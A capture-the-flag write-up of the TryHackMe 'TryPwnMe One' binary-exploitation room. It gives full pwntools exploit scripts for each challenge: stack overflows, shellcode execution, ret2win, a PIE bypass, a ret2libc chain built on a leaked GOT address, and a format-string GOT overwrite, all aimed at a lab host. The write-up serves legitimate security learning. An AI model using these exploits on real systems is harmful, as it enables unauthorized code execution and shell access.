---
title: "TryHackMe: TryPwnMe One"
author: jaxafed
categories: [TryHackMe]
tags: [python, pwn, gdb, binary exploitation, buffer overflow, rop, ret2win, ret2libc, format string attack]
render_with_liquid: false
media_subpath: /images/tryhackme_trypwnme_one/
image:
  path: room_image.webp
---

TryPwnMe One was a room dedicated to binary exploitation (pwn), featuring seven challenges related to this subject.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/trypwnmeone){: .center }

## TryOverflowMe 1

We begin with `TryOverflowMe 1`, using the following reference code as a starting point:

```c
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

We can immediately identify the vulnerability.

It initializes an array with a size of 16 bytes.

```c
char buf[0x10];
```

Then, the `gets` function is then called with this array, which reads user input and writes it to the `buf` array until it encounters a newline or the end of file (EOF). We can exploit this to write beyond the allocated space for the array on the stack.

```c
gets(buf);
```

To read the flag, our objective is to pass the `if (admin)` check. We can achieve this by exploiting the buffer overflow vulnerability to overwrite the value of the `admin` variable.

First, we need to determine the locations of the `buf` and `admin` variables on the stack. We can accomplish this by using `gdb` to display the disassembly of the `main` function.

```console
$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 -ex 'disassemble main'
...
   0x00000000004008f6 <+28>:    mov    DWORD PTR [rbp-0x4],0x0
...
   0x0000000000400909 <+47>:    lea    rax,[rbp-0x30]
   0x000000000040090d <+51>:    mov    rdi,rax
   0x0000000000400910 <+54>:    mov    eax,0x0
   0x0000000000400915 <+59>:    call   0x400680 <gets@plt>
...
```

We observe that the `buf` array is located at `rbp-0x30`, while the `admin` variable is positioned at `rbp-0x4`.

Thus, the `admin` variable is situated `44` bytes `(0x30 - 0x4)` beyond the start of the `buf` array.

To exploit this, we will write a `Python` script utilizing the `pwntools` library.

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "error"

r = remote("10.10.74.205", 9003)

payload = b"A" * 44     # offset to the admin variable
payload += p64(1)       # overwrite the admin variable with 1

r.recvuntil(b"Please go ahead and leave a comment :\n")
r.sendline(payload)
print(r.recvline().decode())
r.close()
```

Upon executing it, we obtain the first flag.

## TryOverflowMe 2

For `TryOverflowMe 2`, we are provided with the following reference code:

```c
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){
    
    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

The vulnerability in this case is the same as that in `TryOverflowMe 1`; however, this time we need to overwrite the `admin` variable with a specific value (`0x59595959`) rather than any non-zero value. Additionally, there are other variables situated between the `buf` array and the `admin` variable.

As before, we begin by identifying the locations of the variables on the stack.

```console
$ gdb -batch ./materials-TryPwnMeOne/TryOverFlowMe2/overflowme2 -ex 'disassemble main'
...
   0x000000000040096c <+28>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400973 <+35>:    mov    DWORD PTR [rbp-0x8],0x1
   0x000000000040097a <+42>:    mov    DWORD PTR [rbp-0xc],0x0
...
   0x000000000040098d <+61>:    lea    rax,[rbp-0x50]
   0x0000000000400991 <+65>:    mov    rdi,rax
   0x0000000000400994 <+68>:    mov    eax,0x0
   0x0000000000400999 <+73>:    call   0x400680 <gets@plt>
...
```

The locations of the variables on the stack are as follows:

- `buf`  : `rbp-0x50`
- `check`: `rbp-0xc`
- `guess`: `rbp-0x8`
- `admin`: `rbp-0x4`

Thus, the `admin` variable is reached after 76 bytes (`0x50 - 0x4`).

We can adapt the exploit from the first challenge by adjusting the offset and the value to be written as follows:

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "error"

r = remote("10.10.74.205", 9004)

payload = b"A" * 76         # offset to the admin variable
payload += p32(0x59595959)  # overwrite the admin variable with 0x59595959

r.recvuntil(b"Please go ahead and leave a comment :\n")
r.sendline(payload)
print(r.recvline().decode())
r.close()
```

Upon running it, we obtain the second flag.

## TryExecMe

For `TryExecMe`, the provided reference code is as follows:

```c
int main(){
    setup();
    banner();
    char *buf[128];   

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```

This time, there is no buffer overflow. The executable reads our input into the `buf` variable, casts the input as a function, and then calls it, effectively executing our input.

To solve this challenge, all we need to do is provide a shellcode that spawns a shell.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = remote("10.10.74.205", 9005)

payload = asm(shellcraft.sh())      # generates a shellcode that spawns /bin/sh

r.recvuntil(b"Give me your shell, and I will execute it: \n")

r.sendline(payload)

r.recvuntil(b"Executing Spell...\n\n")
# r.interactive()                   # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```

With this, we get the third flag.

## TryRetMe

### Solving the Challenge

For the `TryRetMe` challenge, we are given the below reference code:

```c
int win(){

    system("/bin/sh");
}

void vuln(){
    char *buf[0x20];
    puts("Return to where? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```

The vulnerability is similar to those in the previous challenges:

First, it allocates an array with `256` bytes.

```c
char *buf[0x20];
```

> This time, the elements in the array are `char *` (char pointers), each of which is 8 bytes, rather than `char`, which is 1 byte. Therefore, the buffer size is `0x20 * 8 = 256 (0x100)` bytes.
{: .prompt-tip }

We can also see this as such in the function disassembly:

```console
$ gdb -batch ./materials-TryPwnMeOne/TryRetMe/tryretme -ex 'disassemble vuln'
...
   0x000000000040120f <+27>:    lea    rax,[rbp-0x100]
   0x0000000000401216 <+34>:    mov    edx,0x200
   0x000000000040121b <+39>:    mov    rsi,rax
   0x000000000040121e <+42>:    mov    edi,0x0
   0x0000000000401223 <+47>:    call   0x401090 <read@plt>

```

After that, it reads 512 bytes (`0x200`) into the buffer, which exceeds the allocated buffer size.

```c
read(0, buf, 0x200);
```

This time, there are no variables to overwrite; instead, we have the `win` function, which spawns a shell.

To exploit this, we will manipulate the `return address`, which is located on the stack immediately after the `RBP`. The `return address` is a pointer that indicates where the program should resume execution after a function call. By overwriting this address with the address of the `win` function, we ensure that, upon completion of the `vuln` function, the program will continue execution from the `win` function.

We can accomplish this as follows:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF(
    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
)

r = remote("10.10.74.205", 9006)

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]
win_function_address = binary.symbols["win"]

payload = b"A" * 256                        # offset to the RBP
payload += b"B" * 8                         # overwrite the RBP
payload += p64(ret)                         # overwrite the return address with the ret instruction for stack allignment
payload += p64(win_function_address)        # address of the win function

r.recvuntil(b"Return to where? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                           # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```

### Stack Allignment

Examining the code, you may wonder why we include a `ret` instruction before jumping to the `win` function. This is necessary for stack alignment.

You can read more about stack alignment [here](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment).

To understand the need for the `ret` instruction for proper stack alignment, you can run the following code, which does not include it:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF(
    "./materials-TryPwnMeOne/TryRetMe/tryretme", checksec=False
)

r = process()
gdb.attach(r)

win_function_address = binary.symbols["win"]

payload = b"A" * 256                    # offset to the RBP
payload += b"B" * 8                     # overwrite the RBP
payload += p64(win_function_address)    # address of the win function

r.recvuntil(b"Return to where? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
r.interactive()
```

As observed, the program crashes when attempting to spawn a shell upon reaching the `movaps` instruction, which utilizes 16-byte `xmm` registers while the stack is not 16-byte aligned (`0x7ffc7e10b478 % 16 = 8`).

![Task 6 Crash](task_6_crash.webp){: width="700" height="200" }

## Random Memories

For `Random Memories`, the provided code is as follows:

```c
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```

So, what makes this one different from the previous challenge? We can identify this by checking the protections enabled for the binaries using `checksec`.

```
$ checksec ./materials-TryPwnMeOne/TryRetMe/tryretme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ checksec ./materials-TryPwnMeOne/RandomMemories/random
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

As we can see, previously `PIE` (Position-Independent Executable) was not enabled. This means that when the binary runs, it is loaded at the same memory address each time (`0x400000`).

However, with `PIE` enabled and `ASLR` (Address Space Layout Randomization) in effect, the binary is loaded at a random memory address each time it runs. This makes it difficult to predict where the `win` function will be located, preventing us from directly overwriting the return address with it.

So, how can we address this issue? Fortunately, right before reading our input, the binary prints the address of the `vuln` function.

```c
printf("I can give you a secret %llx\n", &vuln);
```

The binary will be loaded into a different, random memory address each time it runs, but it is still the same binary. This means that if we know the address of the `vuln` function and its offset in the binary (which we can easily determine since we have the binary), we can calculate the base address where the binary is loaded. With this information, we can also determine the addresses of any other functions in the binary and exploit it in the same way as before.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/RandomMemories/random", checksec=False)

r = remote("10.10.74.205", 9007)

r.recvuntil(b"I can give you a secret ")
vuln_address = int(r.recvline().rstrip().decode(), 16)  # parse the printed address of the vuln function
print(f"[+] Got the vuln function address: {hex(vuln_address)}")

binary_base_address = vuln_address - binary.symbols["vuln"] # calculate the base address the binary is loaded
print(f"[+] Calculated the binary base address: {hex(binary_base_address)}")

binary.address = binary_base_address    # set the binary base address to match the process's memory layout

win_address = binary.symbols["win"]
print(f"[+] Calculated the win function address: {hex(win_address)}")

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                # offset to the RBP
payload += b"B" * 8                 # overwrite the RBP
payload += p64(ret)                 # ret instruction for stack alignment
payload += p64(win_address)         # calculated address of the win function 

r.recvuntil(b"Where are we going? : \n")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                   # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```

## The Librarian

For `The Librarian`, we are provided with the reference code:

```c
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

This time, we have yet another buffer overflow vulnerability, but there is no function to jump to or variable to overwrite.

Checking the binary with `checksec`, we see that `PIE` is not enabled. This means we can overwrite the return address to jump to any part of the binary. However, there is nothing in the binary that directly helps us obtain the flag.

```console
$ checksec ./materials-TryPwnMeOne/TheLibrarian/thelibrarian
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'.'
```

So, what can we do? Even though there is nothing useful directly in the binary, it is linked with the `libc` library, which provides functions like `puts` and `read`. The `libc` library also includes useful functions like `system`, which we can use to spawn a shell.

If we can overwrite the return address with the address of the `system` function and provide the correct parameters for this function call, we can spawn a shell. However, we face the same issue as before: with `PIE` enabled for `libc` and `ASLR` in effect, we cannot predict the exact address where `libc` will be located.

```console
$ checksec ./materials-TryPwnMeOne/TheLibrarian/libc.so.6
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

---

At this stage, we can attempt to leak an address from the `libc` library to determine its location in memory. But to achieve this, we need to know a bit about the `PLT` (Procedure Linkage Table) and `GOT` (Global Offset Table).

The `GOT` stores addresses for global variables and functions used by the binary, while the `PLT` facilitates calling external functions, even if they are loaded at different addresses each time the binary runs.

When an external function is called, the request initially goes through a `PLT` entry. 

On the first call, this `PLT` entry resolves the function’s actual address and updates the `GOT` entry with the correct address before jumping to it.

On subsequent calls to the same function, the `PLT` entry uses the updated address in the `GOT`, directly jumping to this resolved address.

---

In our case, the binary calls the `puts` function right before reading our input. Therefore, the `GOT` entry for `puts` will have been resolved with the function’s address from `libc`. We also know that calling a function's `PLT` entry is equivalent to calling the function itself.

By calling the `puts` function with its `GOT` entry as an argument, we can make the binary print the address of the `puts` function from `libc`. This address allows us to calculate the base address where `libc` is loaded and subsequently determine the addresses of other functions within `libc`.

---

Also, to be able call the `puts` function with the `GOT` entry as an argument, we need to pass the argument in the `RDI` register according to the Linux x64 calling convention. To achieve this, we need a way to load the address of the `GOT` entry into the `RDI` register. For this, we will use a gadget.

Gadgets are basically sequences of instructions that end with a `ret` instruction. They allow us to perform specific operations while maintaining control over the program’s flow due to the `ret` instruction at the end.

To set the `RDI` register, we will use the `pop rdi; ret` gadget found in the binary. Since `PIE` is not enabled, we know the address of this gadget and can use it directly.

> The `pop rdi` instruction pops the value from the top of the stack into the `RDI` register. Since we control the stack, we can place any value we want onto the stack. By doing this, we can set the argument for a function call, allowing us to pass the address of the `GOT` entry to the `puts` function.
{: .prompt-tip }

Now that we have everything we need, we can proceed to leak the `puts` address from the `GOT` entry as follows:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)

r = remote("10.10.74.205", 9008)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                # offset to the RBP
payload += b"B" * 8                 # overwrite the RBP
payload += p64(ret)                 # ret for stack alignment
payload += p64(pop_rdi_ret)         # pop rdi gadget
payload += p64(binary.got["puts"])  # value for rdi
payload += p64(binary.plt["puts"])  # call puts

r.recvuntil(b"Again? Where this time? : ")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")

leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
print(f"[+] Calculated base address of libc: {hex(libc_base_address)}")
```

Now that we can leak an address from `libc` and calculate where it is loaded, what we can do next is, instead of exiting after leaking the address, we can make the program execute the `vuln` function again. This allows us to exploit the same vulnerability, but this time with knowledge of the `libc` base address and the ability to call the `system` function from `libc`.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)

r = remote("10.10.74.205", 9008)

rop = ROP(binary)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = b"A" * 256                        # offset to the RBP
payload += b"B" * 8                         # overwrite the RBP
payload += p64(ret)                         # ret for stack alignment
payload += p64(pop_rdi_ret)                 # pop rdi gadget
payload += p64(binary.got["puts"])          # value for rdi
payload += p64(binary.plt["puts"])          # call puts
payload += p64(binary.symbols["vuln"])      # jump back to vuln

r.recvuntil(b"Again? Where this time? : ")
r.sendline(payload)
r.recvuntil(b"ok, let's go!\n\n")

leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc

print(f"[+] Calculated the base address of LIBC: {hex(libc_base_address)}")
libc.address = libc_base_address                # set the libc base address to match the remote process's memory layout


r.recvuntil(b"Again? Where this time? : ")
payload2 = b"A" * 256                           # offset to the RBP
payload2 += b"B" * 8                            # overwrite the RBP
payload2 += p64(pop_rdi_ret)                    # pop rdi gadget
# The libc library already includes the /bin/sh string. 
# We can use the search function to find its address in libc.
# Once we have this address, we can use the same gadget to set it as an argument for the system function.
payload2 += p64(next(libc.search(b"/bin/sh")))  # value of rdi
payload2 += p64(libc.symbols["system"])         # call system("/bin/sh")
r.sendline(payload2)
r.recvuntil(b"ok, let's go!\n\n")
# r.interactive()                               # uncomment for an interactive shell
r.sendline(b"cat flag.txt")
print(r.recvline().decode())
r.close()
```

## Not Specified

For the `Not Specified` challenge, we are provided with the following reference code:

```c
int win(){
    system("/bin/sh\0");
}

int main(){
    setup();
    banner();
    char *username[32];
    puts("Please provide your username\n");
    read(0,username,sizeof(username));
    puts("Thanks! ");
    printf(username);
    puts("\nbye\n");
    exit(1);
}
```

As before, the binary declares an array and reads our input into it. But this time it only reads a number of bytes equal to the size of the array, so there is no buffer overflow vulnerability.

```c
char *username[32];
puts("Please provide your username\n");
read(0,username,sizeof(username));
```

However, the binary passes our input directly to the `printf` function as an argument, creating a format string vulnerability.

```c
printf(username);
```

Calling `printf` with our input allows us to use format specifiers. We can utilize format specifiers such as `%p` or `%c` to read values from the stack.

```console
$ nc 10.10.74.205 9009
...
Please provide your username

%p
Thanks!
0x7fa6639cd723
```

We can also observe that our input is located as the sixth item on the stack.

```console
$ nc 10.10.74.205 9009
Please provide your username

AAAAAAAA%p.%p.%p.%p.%p.%p
Thanks!
AAAAAAAA0x7f31fa505723.(nil).0x7f31fa426297.0x9.0x4.0x4141414141414141

```

Knowing this, we can also reference it as such:

```console
$ nc 10.10.74.205 9009
Please provide your username

AAAAAAAA%6$p
Thanks!
AAAAAAAA0x4141414141414141
```

Additionally, we can use the `%n` format specifier to write to the program's memory. This specifier writes the number of characters printed so far into the specified memory location.

For example, consider running the script below:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

r = process("./materials-TryPwnMeOne/NotSpecified/notspecified")
gdb.attach(r)

payload = b"A" * 8
payload += b"%6$n"
r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
```

We can see that it crashes inside `printf` because it attempts to write the value `8` to the address `0x4141414141414141`, which is not a valid memory address that the program can access.

![Task 9 Crash](task_9_crash.webp){: width="900" height="400" }

So, how can we exploit this? We observe that the binary calls the `puts` function both before reading our input and after the call to `printf`.

From previous challenges, we know that after the first call to `puts`, its `GOT` entry will store the function's address in memory and subsequent calls to the `puts` funtion will use this resolved address. To exploit this, we can overwrite the address in the `GOT` entry with the address of the `win` function. Consequently, when `puts` is called again, it will execute the `win` function instead.

### Creating the Payload Manually 

Let's begin with our manual exploit attempt. First, we will modify our payload by placing our input after the format specifiers. This is because we will use the format specifiers to overwrite memory addresses, by changing our input to those memory addresses which include null bytes (`0x00`). These null bytes will cause `printf` to stop printing when it encounters them.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

r = process()
payload = b"%12$p %13$p %14$p %15$p".ljust(48, b"-")
payload += b"A"*8
payload += b"B"*8
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
print(r.recvall().decode())
r.close()
```

We can see that we are able to locate our inputs on the stack using the offsets 12, 13, 14, and 15.

```console
$ python3 exploit.py

Thanks!
0x4141414141414141 0x4242424242424242 0x4343434343434343 0x4444444444444444-------------------------AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD

bye
```

Now, all we have to do is modify our input to target the memory address of the `puts` function’s `GOT` entry and attempt to write the address of the `win` function to it which we can discover as `0x4011f6` using `readelf`.

```console
$ readelf -s ./materials-TryPwnMeOne/NotSpecified/notspecified | grep win
    62: 00000000004011f6    23 FUNC    GLOBAL DEFAULT   15 win
```

However, since `%n` writes the number of characters printed so far to the specified memory address, and printing `0x4011f6` characters is impractical, we will write the address in multiple steps.

First, we will clear the address using the `ll` length sub-specifier with `%n`. This will make `printf` write the number of characters printed as a `long long int` (8 bytes). Since no characters are printed yet, this will essentially zero out the address specified.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln %13$p %14$p %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += b"B"*8
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```

Checking this in `GDB`, we can confirm that it works as expected.

```console
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x0000000000000000
```

Next, we can write the least significant byte (`0xf6`) of the `win` function's address (`0x4011f6`). To do this, we first make `printf` print `246` characters (which corresponds to `0xf6` in hexadecimal) using `%246c`, then using the `%13$n` format specifier to write this value to the address.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln%246c%13$n %14$p %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += b"C"*8
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```

We see this works as expected.

```console
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000000000f6
```

Next, we will move on to writing `0x11`, the second least significant byte of the `win` function's address (`0x4011f6`). Since we have already printed `246` characters (which exceeds `0x11`), we can print an additional `27` bytes to make the total count of printed characters `273` (`0x111` in hexadecimal). 

Then, we will use the `hh` (`char`) length sub-specifier with `%n` to ensure that `printf` writes only the least significant byte (`0x11`) of the printed character count (`0x111`). 

Additionally, in our input, we need to increment the address so that `printf` writes to the next byte.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
gdb.attach(r)

payload = b"%12$lln%246c%13$n%27c%14$hhn %15$p".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += b"D"*8

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```

```console
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000000011f6
```

Finally, to write the last byte, `0x40`, we need to print `47` additional characters. This will make the total count of printed characters `0x140`.

To calculate this:
- `0x140` (total characters needed) - `0x111` (characters already printed) = `0x2f` (47 additional characters).


```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = process()
payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += p64(puts_got+2)

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```

With this, we successfully overwrite the `GOT` entry for `puts` with the address of the `win` function.

```console
pwndbg> x/gx &'puts@got.plt'
0x404020 <puts@got.plt>:        0x00000000004011f6
```

Now, we can modify our script to exploit the remote target and gain a shell.

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

puts_got = binary.got["puts"]

r = remote("10.10.74.205", 9009)
payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
payload += p64(puts_got)
payload += p64(puts_got)
payload += p64(puts_got+1)
payload += p64(puts_got+2)

r.recvuntil(b"Please provide your username\n")
r.sendline(payload)
r.interactive()
r.close()
```

```console
$ python3 exploit.py

Thanks!
...
$ id
uid=1000 gid=1000 groups=1000
$ wc -c flag.txt
37 flag.txt
```

### Using pwntools for Payload Generation

Alternatively, instead of manually generating our payload for the format string vulnerability, we could use the `fmtstr_payload` function from `pwntools` to create it for us.

All we need to do is provide the offset of our input on the stack, the address where we want to write, and the value we want to write, as shown below:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level = "error")
context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)

r = remote("10.10.74.205", 9009)
payload = fmtstr_payload(6, {binary.got["puts"] : binary.symbols["win"]})
r.sendline(payload)
r.interactive()
r.close()
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>